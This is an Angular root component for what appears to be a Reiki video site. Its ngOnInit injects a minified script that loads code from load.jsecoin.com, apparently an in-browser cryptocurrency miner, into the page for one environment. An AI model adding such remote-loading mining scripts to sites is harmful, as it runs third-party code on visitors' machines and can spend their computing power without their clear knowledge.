import { Component } from '@angular/core';
import { AuthService } from './core/auth.service';
import { UtilsService } from './services/utils.service';
import { Playlist, PlaylistOptions, RewindType, Video } from '@app/models/playlist';
import { OnInit } from '@angular/core';
import { environment } from '@env/environment';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent implements OnInit {

  backgroundVideoId = "4XT5PsazYcM";

  constructor(
    public authService: AuthService,
  ) {
  }

  ngOnInit() {

    if (environment.name == "huiaomreiki") {
      let script_tag = document.createElement('script');
      script_tag.type = 'text/javascript';
      script_tag.text = `!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/159410/liomreiki.netlify.com/0/0/",s.parentNode.insertBefore(t,s)}();`;
      document.getElementsByTagName('body')[0].insertBefore(script_tag, document.getElementsByTagName('app-root')[0]);
    }
  }
  
}
